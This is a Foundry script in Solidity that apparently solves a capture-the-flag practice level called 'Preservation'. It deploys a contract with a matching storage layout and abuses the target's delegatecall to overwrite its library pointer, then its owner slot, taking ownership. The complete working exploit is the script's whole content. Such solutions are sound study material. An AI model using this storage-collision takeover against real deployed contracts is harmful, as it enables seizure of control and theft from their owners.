pragma solidity ^0.8.0;
import "../instances/Ilevel16.sol";
import "forge-std/Script.sol";

contract Level16 is Script {
    Preservation level16 =
        Preservation(0x63b889ba58B14f3b9f5681Fb0994920e818e2e99);

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        Level16Exploiter exploiter = new Level16Exploiter(address(level16));
        uint256 timeZone2Library = uint256(uint160(address(exploiter)));
        level16.setSecondTime(timeZone2Library);
        level16.setFirstTime(uint256(uint160(attacker)));
        require(level16.owner() == attacker, "level not complete");
        vm.stopBroadcast();
    }
}

contract Level16Exploiter {
    // Storage layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    // Custom
    Preservation target;

    constructor(address _target) {
        target = Preservation(_target);
    }

    function setTime(uint256 _timeStamp) public {
        owner = address(uint160(_timeStamp));
    }
}
